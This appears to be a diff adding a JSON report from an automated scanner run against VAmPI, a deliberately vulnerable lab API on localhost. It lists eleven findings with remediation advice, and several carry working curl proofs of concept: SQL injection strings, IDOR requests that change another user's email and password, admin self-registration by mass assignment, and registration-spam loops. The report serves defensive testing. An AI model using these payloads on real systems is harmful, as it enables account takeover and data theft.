@@ -1,0 +1,659 @@
+{
+  "report_id": "VAMPI-20260810-212937-218F31",
+  "target_url": "http://localhost:5000",
+  "scan_started_at": "2026-08-10T21:29:37.728196Z",
+  "scan_completed_at": "2026-08-10T21:30:13.257026Z",
+  "scanner_version": "2.0.0",
+  "phase": "Phase 2 — Security Testing",
+  "catalog_source": "http://localhost:5000",
+  "executive_summary": "Security assessment of http://localhost:5000 identified 11 vulnerability finding(s), of which 10 were positively confirmed with proof-of-concept evidence. The overall risk posture is rated CRITICAL based on a highest CVSS base score of 9.8. Findings breakdown: 3 Critical, 3 High, 5 Medium, 0 Low. Immediate remediation is recommended for all Critical and High severity findings prior to any production deployment.",
+  "statistics": {
+    "total_endpoints_tested": 41,
+    "total_tests_run": 6,
+    "total_findings": 11,
+    "confirmed_vulnerabilities": 10,
+    "by_severity": {
+      "MEDIUM": 5,
+      "HIGH": 3,
+      "CRITICAL": 3
+    },
+    "by_owasp_category": {
+      "API2:2019 Broken User Authentication": 1,
+      "API1:2019 Broken Object Level Authorization": 3,
+      "API5:2019 Broken Function Level Authorization": 1,
+      "API8:2019 Injection": 1,
+      "API3:2019 Excessive Data Exposure": 1,
+      "API7:2019 Security Misconfiguration": 1,
+      "API6:2019 Mass Assignment": 1,
+      "API4:2019 Lack of Resources & Rate Limiting": 2
+    },
+    "by_status": {
+      "VULNERABLE": 10,
+      "LIKELY": 1
+    },
+    "highest_cvss": 9.8,
+    "risk_posture": "CRITICAL"
+  },
+  "findings": [
+    {
+      "vuln_id": "AUTH-001",
+      "title": "User Enumeration via Login Error Messages",
+      "owasp_category": "API2:2019 Broken User Authentication",
+      "endpoint": "/users/v1/login",
+      "method": "POST",
+      "cvss": {
+        "base_score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "severity": "MEDIUM"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "Login error for non-existent user reveals account existence. Response: { \"status\": \"fail\", \"message\": \"Username does not exist\"}",
+      "impact": "Attackers can enumerate valid usernames by observing error message differences.",
+      "evidence": [
+        {
+          "method": "POST",
+          "url": "http://localhost:5000/users/v1/login",
+          "request_headers": {},
+          "request_body": {
+            "username": "nonexistent_01df47",
+            "password": "x"
+          },
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "status": "fail",
+            "message": "Username does not exist"
+          },
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -X POST http://localhost:5000/users/v1/login \\\n  -d '{\"username\":\"nonexistent_01df47\",\"password\":\"x\"}'\n# Response reveals: user does not exist",
+      "remediation": [
+        "Return a generic error message for all failed login attempts.",
+        "Use the same response for wrong username and wrong password.",
+        "Implement account lockout after N failed attempts."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa2-broken-user-authentication/",
+        "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"
+      ],
+      "discovered_at": "2026-08-10T21:29:40.640646Z"
+    },
+    {
+      "vuln_id": "BOLA-001",
+      "title": "Broken Object Level Authorization — Cross-User Profile Read",
+      "owasp_category": "API1:2019 Broken Object Level Authorization",
+      "endpoint": "/users/v1/{username}",
+      "method": "GET",
+      "cvss": {
+        "base_score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "severity": "HIGH"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "User 'bola_a_389cfd' (authenticated with their own JWT) successfully accessed User 'bola_b_389cfd's profile data by simply changing the username in the URL. The API does not verify that the requesting user owns the resource.",
+      "impact": "Any authenticated user can read any other user's profile data, including potentially sensitive fields like email addresses and admin flags.",
+      "evidence": [
+        {
+          "method": "GET",
+          "url": "http://localhost:5000/users/v1/bola_b_389cfd",
+          "request_headers": {
+            "Authorization": "Bearer <User_A_JWT>"
+          },
+          "request_body": null,
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "username": "bola_b_389cfd",
+            "email": "b_389cfd@test.invalid"
+          },
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "# Login as User A to get JWT\ncurl -X POST http://localhost:5000/users/v1/login -d '{\"username\":\"bola_a_389cfd\",\"password\":\"...\"}'\n\n# Use User A's JWT to access User B's data\ncurl -H 'Authorization: Bearer <JWT_A>' http://localhost:5000/users/v1/bola_b_389cfd",
+      "remediation": [
+        "Verify that the authenticated user ID matches the requested resource owner ID.",
+        "Use the JWT sub/username claim to authorise resource access, not the URL parameter.",
+        "Implement object-level access control checks in every endpoint handler.",
+        "Return HTTP 403 Forbidden when a user attempts to access another user's resource."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
+      ],
+      "discovered_at": "2026-08-10T21:29:42.082750Z"
+    },
+    {
+      "vuln_id": "BOLA-002",
+      "title": "IDOR — Unauthorized Email Update on Another User's Account",
+      "owasp_category": "API1:2019 Broken Object Level Authorization",
+      "endpoint": "/users/v1/{username}/email",
+      "method": "PUT",
+      "cvss": {
+        "base_score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "severity": "HIGH"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "User 'bola_a_389cfd' successfully updated User 'bola_b_389cfd's email to 'hacked_62b257@evil.invalid'. This is an Insecure Direct Object Reference (IDOR) vulnerability.",
+      "impact": "Account takeover: attacker changes victim's email and requests password reset.",
+      "evidence": [
+        {
+          "method": "PUT",
+          "url": "http://localhost:5000/users/v1/bola_b_389cfd/email",
+          "request_headers": {
+            "Authorization": "Bearer <User_A_JWT>"
+          },
+          "request_body": {
+            "email": "hacked_62b257@evil.invalid"
+          },
+          "response_status": 204,
+          "response_headers": {},
+          "response_body": null,
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"email\":\"attacker@evil.com\"}' http://localhost:5000/users/v1/bola_b_389cfd/email",
+      "remediation": [
+        "Extract username from the validated JWT token, not the URL.",
+        "Verify the JWT subject matches the URL username before processing.",
+        "Implement resource ownership middleware for all user-scoped endpoints."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
+      ],
+      "discovered_at": "2026-08-10T21:29:42.656076Z"
+    },
+    {
+      "vuln_id": "BOLA-003",
+      "title": "IDOR — Unauthorized Password Change on Another User's Account",
+      "owasp_category": "API1:2019 Broken Object Level Authorization",
+      "endpoint": "/users/v1/{username}/password",
+      "method": "PUT",
+      "cvss": {
+        "base_score": 9.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "severity": "CRITICAL"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "User 'bola_a_389cfd' successfully changed User 'bola_b_389cfd's password without knowing the current password.",
+      "impact": "Complete account takeover — attacker locks victim out of their account.",
+      "evidence": [
+        {
+          "method": "PUT",
+          "url": "http://localhost:5000/users/v1/bola_b_389cfd/password",
+          "request_headers": {
+            "Authorization": "Bearer <User_A_JWT>"
+          },
+          "request_body": {
+            "password": "<redacted>"
+          },
+          "response_status": 204,
+          "response_headers": {},
+          "response_body": null,
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -X PUT -H 'Authorization: Bearer <JWT_A>' -H 'Content-Type: application/json' -d '{\"password\":\"hacker_new_pass\"}' http://localhost:5000/users/v1/bola_b_389cfd/password",
+      "remediation": [
+        "Only allow users to change their own password (verify JWT subject == URL username).",
+        "Require current password confirmation before allowing password change.",
+        "Implement strong audit logging for all password change operations."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
+      ],
+      "discovered_at": "2026-08-10T21:29:42.940266Z"
+    },
+    {
+      "vuln_id": "BOLA-004",
+      "title": "User List Accessible Without Authentication",
+      "owasp_category": "API5:2019 Broken Function Level Authorization",
+      "endpoint": "/users/v1",
+      "method": "GET",
+      "cvss": {
+        "base_score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "severity": "MEDIUM"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "The user listing endpoint returns data without any authentication. This exposes usernames and potentially other sensitive fields.",
+      "impact": "Enables user enumeration and reconnaissance for targeted attacks.",
+      "evidence": [
+        {
+          "method": "GET",
+          "url": "http://localhost:5000/users/v1",
+          "request_headers": {},
+          "request_body": null,
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "users": [
+              {
+                "email": "mail1@mail.com",
+                "username": "name1"
+              },
+              {
+                "email": "mail2@mail.com",
+                "username": "name2"
+              },
+              {
+                "email": "admin@mail.com",
+                "username": "admin"
+              },
+              {
+                "email": "sectest_35d70450@sectest.invalid",
+                "username": "sectest_35d70450"
+              },
+              {
+                "email": "hacked_62b257@evil.invalid",
+                "username": "bola_a_389cfd"
+              },
+              {
+                "email": "b_389cfd@test.invalid",
+                "username": "bola_b_389cfd"
+              }
+            ]
+          },
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl http://localhost:5000/users/v1",
+      "remediation": [
+        "Require authentication for all user listing endpoints.",
+        "Restrict user listing to admin roles only.",
+        "Implement pagination and rate limiting on public endpoints."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa1-broken-object-level-authorization/"
+      ],
+      "discovered_at": "2026-08-10T21:29:43.216013Z"
+    },
+    {
+      "vuln_id": "INJ-001",
+      "title": "Potential SQL Injection — Email Update Endpoint (VAmPI Known Vulnerability)",
+      "owasp_category": "API8:2019 Injection",
+      "endpoint": "/users/v1/{username}/email",
+      "method": "PUT",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "severity": "CRITICAL"
+      },
+      "status": "LIKELY",
+      "confirmed": false,
+      "description": "VAmPI's email update endpoint is documented as containing SQL injection. Automated error signatures were not detected (VAmPI may swallow errors), but manual testing with UNION-based payloads is recommended.",
+      "impact": "Potential full database access via SQL injection.",
+      "evidence": [
+        {
+          "method": "PUT",
+          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "request_headers": {
+            "Authorization": "Bearer <JWT>"
+          },
+          "request_body": {
+            "email": "test' OR '1'='1@test.invalid"
+          },
+          "response_status": 400,
+          "response_headers": {},
+          "response_body": {
+            "status": "fail",
+            "message": "Please Provide a valid email address."
+          },
+          "elapsed_ms": 281.0
+        },
+        {
+          "method": "PUT",
+          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "request_headers": {
+            "Authorization": "Bearer <JWT>"
+          },
+          "request_body": {
+            "email": "test'; DROP TABLE users; --@test.invalid"
+          },
+          "response_status": 400,
+          "response_headers": {},
+          "response_body": {
+            "status": "fail",
+            "message": "Please Provide a valid email address."
+          },
+          "elapsed_ms": 281.0
+        },
+        {
+          "method": "PUT",
+          "url": "http://localhost:5000/users/v1/inj_feaef731/email",
+          "request_headers": {
+            "Authorization": "Bearer <JWT>"
+          },
+          "request_body": {
+            "email": "test' UNION SELECT username, password, 1 FROM users--@test.invalid"
+          },
+          "response_status": 400,
+          "response_headers": {},
+          "response_body": {
+            "status": "fail",
+            "message": "Please Provide a valid email address."
+          },
+          "elapsed_ms": 281.0
+        }
+      ],
+      "proof_of_concept": "curl -X PUT http://localhost:5000/users/v1/inj_feaef731/email \\\n  -H 'Authorization: Bearer <JWT>' \\\n  -d '{\"email\":\"' UNION SELECT username,password,1 FROM users--@x.com\"}'",
+      "remediation": [
+        "Use parameterised queries for all database interactions.",
+        "Validate and sanitise email format before query execution."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa8-injection/"
+      ],
+      "discovered_at": "2026-08-10T21:29:46.012859Z"
+    },
+    {
+      "vuln_id": "EXPO-001",
+      "title": "Debug Endpoint Exposes Sensitive Data — /users/v1/_debug",
+      "owasp_category": "API3:2019 Excessive Data Exposure",
+      "endpoint": "/users/v1/_debug",
+      "method": "GET",
+      "cvss": {
+        "base_score": 7.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "severity": "HIGH"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "The /users/v1/_debug endpoint is accessible and returns data. Debug endpoints should never be exposed in any environment. Exposed sensitive fields: ['admin', 'password']",
+      "impact": "Debug endpoints can expose internal system details, all user records, and credentials.",
+      "evidence": [
+        {
+          "method": "GET",
+          "url": "http://localhost:5000/users/v1/_debug",
+          "request_headers": {},
+          "request_body": null,
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "users": [
+              {
+                "admin": false,
+                "email": "mail1@mail.com",
+                "password": "pass1",
+                "username": "name1"
+              },
+              {
+                "admin": false,
+                "email": "mail2@mail.com",
+                "password": "pass2",
+                "username": "name2"
+              },
+              {
+                "admin": true,
+                "email": "admin@mail.com",
+                "password": "pass1",
+                "username": "admin"
+              },
+              {
+                "admin": false,
+                "email": "sectest_35d70450@sectest.invalid",
+                "password": "SecTest@2024!",
+                "username": "sectest_35d70450"
+              },
+              {
+                "admin": false,
+                "email": "hacked_62b257@evil.invalid",
+                "password": "TestPass@1",
+                "username": "bola_a_389cfd"
+              },
+              {
+                "admin": false,
+                "email": "b_389cfd@test.invalid",
+                "password": "hacked_password_123",
+                "username": "bola_b_389cfd"
+              },
+              {
+                "admin": false,
+                "email": "inj_feaef731@test.invalid",
+                "password": "InjTest@2024!",
+                "username": "inj_feaef731"
+              },
+              {
+                "admin": false,
+                "email": "clean@test.invalid",
+                "password": "TestPass@1",
+                "username": "test' OR '1'='1"
+              },
+              {
+                "admin": false,
+                "email": "t' OR '1'='1@test.invalid",
+                "password": "TestPass@1",
+                "username": "sqlitest_8941d0"
+              },
+              {
+                "admin": false,
+                "email": "exp_2fb508ca@test.invalid",
+                "password": "ExpTest@2024!",
+                "username": "exp_2fb508ca"
+              }
+            ]
+          },
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -H 'Authorization: Bearer <JWT>' http://localhost:5000/users/v1/_debug",
+      "remediation": [
+        "Remove all debug/internal endpoints before deployment.",
+        "Use feature flags or environment-specific routing to disable debug routes.",
+        "If debug endpoints are needed, restrict to internal network only.",
+        "Implement proper access control: admin-only with IP whitelisting."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/"
+      ],
+      "discovered_at": "2026-08-10T21:29:50.191823Z"
+    },
+    {
+      "vuln_id": "EXPO-002",
+      "title": "Missing Security Headers in API Responses",
+      "owasp_category": "API7:2019 Security Misconfiguration",
+      "endpoint": "/users/v1",
+      "method": "GET",
+      "cvss": {
+        "base_score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+        "severity": "MEDIUM"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "The following security headers are missing: ['x-content-type-options', 'x-frame-options', 'strict-transport-security', 'content-security-policy', 'x-xss-protection']",
+      "impact": "Increases attack surface for XSS, clickjacking, and MIME sniffing attacks.",
+      "evidence": [
+        {
+          "method": "GET",
+          "url": "http://localhost:5000/users/v1",
+          "request_headers": {},
+          "request_body": null,
+          "response_status": 200,
+          "response_headers": {
+            "server": "Werkzeug/2.2.3 Python/3.11.15",
+            "date": "Mon, 10 Aug 2026 21:29:50 GMT",
+            "content-type": "application/json",
+            "content-length": "875",
+            "connection": "close"
+          },
+          "response_body": null,
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -I http://localhost:5000/users/v1",
+      "remediation": [
+        "Add missing headers: ['x-content-type-options', 'x-frame-options', 'strict-transport-security', 'content-security-policy', 'x-xss-protection']",
+        "Use a security headers middleware (e.g., flask-talisman)."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/"
+      ],
+      "discovered_at": "2026-08-10T21:29:50.461952Z"
+    },
+    {
+      "vuln_id": "MASS-001",
+      "title": "Mass Assignment — Admin Privilege Escalation via Registration",
+      "owasp_category": "API6:2019 Mass Assignment",
+      "endpoint": "/users/v1/register",
+      "method": "POST",
+      "cvss": {
+        "base_score": 9.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "severity": "CRITICAL"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "The registration endpoint accepted the extra field(s) {\"admin\": true} and applied them to the user's account. The user 'mass_8877f51c' was registered with admin privileges by including {\"admin\": true} in the registration payload.",
+      "impact": "Any unauthenticated user can self-register as an administrator, gaining full administrative access to the application.",
+      "evidence": [
+        {
+          "method": "POST",
+          "url": "http://localhost:5000/users/v1/register",
+          "request_headers": {},
+          "request_body": {
+            "username": "mass_8877f51c",
+            "password": "***",
+            "email": "mass_8877f51c@test.invalid",
+            "admin": true
+          },
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "message": "Successfully registered. Login to receive an auth token.",
+            "status": "success"
+          },
+          "elapsed_ms": 0.0
+        },
+        {
+          "method": "GET",
+          "url": "http://localhost:5000/me",
+          "request_headers": {
+            "Authorization": "Bearer <JWT>"
+          },
+          "request_body": null,
+          "response_status": 200,
+          "response_headers": {},
+          "response_body": {
+            "data": {
+              "admin": true,
+              "email": "mass_8877f51c@test.invalid",
+              "username": "mass_8877f51c"
+            },
+            "status": "success"
+          },
+          "elapsed_ms": 0.0
+        }
+      ],
+      "proof_of_concept": "curl -X POST http://localhost:5000/users/v1/register \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\": \"hacker\", \"password\": \"pass\", \"email\": \"h@x.com\", \"admin\": true}'\n# Then login as 'hacker' — admin=true confirmed in profile",
+      "remediation": [
+        "Use a whitelist of allowed registration fields: only username, email, password.",
+        "Never bind request body directly to the user model/ORM object.",
+        "Implement explicit field assignment instead of bulk update patterns.",
+        "Validate and reject any extra fields not in the allowed whitelist.",
+        "Use a dedicated registration DTO that excludes admin/role fields."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/"
+      ],
+      "discovered_at": "2026-08-10T21:29:51.949470Z"
+    },
+    {
+      "vuln_id": "RATE-001",
+      "title": "No Rate Limiting on Registration Endpoint — Account Creation Spam",
+      "owasp_category": "API4:2019 Lack of Resources & Rate Limiting",
+      "endpoint": "/users/v1/register",
+      "method": "POST",
+      "cvss": {
+        "base_score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "severity": "MEDIUM"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "Successfully registered 10 accounts in rapid succession without any rate limiting. All requests returned success status codes.",
+      "impact": "Attackers can create unlimited accounts (bot registration, spam, resource exhaustion of database and storage).",
+      "evidence": [],
+      "proof_of_concept": "for i in range(1000):\n    requests.post('http://localhost:5000/users/v1/register',\n        json={\"username\":f\"spam{i}\",\"password\":\"x\",\"email\":f\"s{i}@x.com\"})",
+      "remediation": [
+        "Implement IP-based rate limiting on registration (max 5/hour per IP).",
+        "Add email verification to prevent disposable email spam.",
+        "Implement CAPTCHA on registration.",
+        "Return HTTP 429 with Retry-After when limit exceeded."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/"
+      ],
+      "discovered_at": "2026-08-10T21:30:04.038300Z"
+    },
+    {
+      "vuln_id": "RATE-002",
+      "title": "No Rate Limiting on User Listing Endpoint",
+      "owasp_category": "API4:2019 Lack of Resources & Rate Limiting",
+      "endpoint": "/users/v1",
+      "method": "GET",
+      "cvss": {
+        "base_score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "severity": "MEDIUM"
+      },
+      "status": "VULNERABLE",
+      "confirmed": true,
+      "description": "Sent 30 rapid GET requests to /users/v1 without 429. Unlimited scraping of user data is possible.",
+      "impact": "Enables bulk user enumeration and DoS via resource exhaustion.",
+      "evidence": [],
+      "proof_of_concept": "# Unlimited user list scraping:\nfor i in range(10000):\n    requests.get('http://localhost:5000/users/v1')",
+      "remediation": [
+        "Implement global API rate limiting (e.g., 100 requests/minute per IP).",
+        "Use a reverse proxy (nginx, Cloudflare) for rate limit enforcement.",
+        "Add pagination to prevent bulk data extraction in a single request."
+      ],
+      "references": [
+        "https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/"
+      ],
+      "discovered_at": "2026-08-10T21:30:13.256681Z"
+    }
+  ],
+  "endpoint_results": [],
+  "remediation_roadmap": [
+    "[P1] [CRITICAL] IDOR — Unauthorized Password Change on Another User's Account: Only allow users to change their own password (verify JWT subject == URL username).",
+    "[P2] [CRITICAL] IDOR — Unauthorized Password Change on Another User's Account: Require current password confirmation before allowing password change.",
+    "[P3] [CRITICAL] IDOR — Unauthorized Password Change on Another User's Account: Implement strong audit logging for all password change operations.",
+    "[P4] [CRITICAL] Mass Assignment — Admin Privilege Escalation via Registration: Use a whitelist of allowed registration fields: only username, email, password.",
+    "[P5] [CRITICAL] Mass Assignment — Admin Privilege Escalation via Registration: Never bind request body directly to the user model/ORM object.",
+    "[P6] [CRITICAL] Mass Assignment — Admin Privilege Escalation via Registration: Implement explicit field assignment instead of bulk update patterns.",
+    "[P7] [CRITICAL] Mass Assignment — Admin Privilege Escalation via Registration: Validate and reject any extra fields not in the allowed whitelist.",
+    "[P8] [CRITICAL] Mass Assignment — Admin Privilege Escalation via Registration: Use a dedicated registration DTO that excludes admin/role fields.",
+    "[P9] [HIGH] Broken Object Level Authorization — Cross-User Profile Read: Verify that the authenticated user ID matches the requested resource owner ID.",
+    "[P10] [HIGH] Broken Object Level Authorization — Cross-User Profile Read: Use the JWT sub/username claim to authorise resource access, not the URL parameter.",
+    "[P11] [HIGH] Broken Object Level Authorization — Cross-User Profile Read: Implement object-level access control checks in every endpoint handler.",
+    "[P12] [HIGH] Broken Object Level Authorization — Cross-User Profile Read: Return HTTP 403 Forbidden when a user attempts to access another user's resource.",
+    "[P13] [HIGH] IDOR — Unauthorized Email Update on Another User's Account: Extract username from the validated JWT token, not the URL.",
+    "[P14] [HIGH] IDOR — Unauthorized Email Update on Another User's Account: Verify the JWT subject matches the URL username before processing.",
+    "[P15] [HIGH] IDOR — Unauthorized Email Update on Another User's Account: Implement resource ownership middleware for all user-scoped endpoints.",
+    "[P16] [HIGH] Debug Endpoint Exposes Sensitive Data — /users/v1/_debug: Remove all debug/internal endpoints before deployment.",
+    "[P17] [HIGH] Debug Endpoint Exposes Sensitive Data — /users/v1/_debug: Use feature flags or environment-specific routing to disable debug routes.",
+    "[P18] [HIGH] Debug Endpoint Exposes Sensitive Data — /users/v1/_debug: If debug endpoints are needed, restrict to internal network only.",
+    "[P19] [HIGH] Debug Endpoint Exposes Sensitive Data — /users/v1/_debug: Implement proper access control: admin-only with IP whitelisting.",
+    "[P20] [MEDIUM] User Enumeration via Login Error Messages: Return a generic error message for all failed login attempts.",
+    "[P21] [MEDIUM] User Enumeration via Login Error Messages: Use the same response for wrong username and wrong password.",
+    "[P22] [MEDIUM] User Enumeration via Login Error Messages: Implement account lockout after N failed attempts.",
+    "[P23] [MEDIUM] User List Accessible Without Authentication: Require authentication for all user listing endpoints.",
+    "[P24] [MEDIUM] User List Accessible Without Authentication: Restrict user listing to admin roles only.",
+    "[P25] [MEDIUM] User List Accessible Without Authentication: Implement pagination and rate limiting on public endpoints.",
+    "[P26] [MEDIUM] Missing Security Headers in API Responses: Add missing headers: ['x-content-type-options', 'x-frame-options', 'strict-transport-security', 'content-security-policy', 'x-xss-protection']",
+    "[P27] [MEDIUM] Missing Security Headers in API Responses: Use a security headers middleware (e.g., flask-talisman).",
+    "[P28] [MEDIUM] No Rate Limiting on Registration Endpoint — Account Creation Spam: Implement IP-based rate limiting on registration (max 5/hour per IP).",
+    "[P29] [MEDIUM] No Rate Limiting on Registration Endpoint — Account Creation Spam: Add email verification to prevent disposable email spam.",
+    "[P30] [MEDIUM] No Rate Limiting on Registration Endpoint — Account Creation Spam: Implement CAPTCHA on registration.",
+    "[P31] [MEDIUM] No Rate Limiting on Registration Endpoint — Account Creation Spam: Return HTTP 429 with Retry-After when limit exceeded.",
+    "[P32] [MEDIUM] No Rate Limiting on User Listing Endpoint: Implement global API rate limiting (e.g., 100 requests/minute per IP).",
+    "[P33] [MEDIUM] No Rate Limiting on User Listing Endpoint: Use a reverse proxy (nginx, Cloudflare) for rate limit enforcement.",
+    "[P34] [MEDIUM] No Rate Limiting on User Listing Endpoint: Add pagination to prevent bulk data extraction in a single request."
+  ]
+}
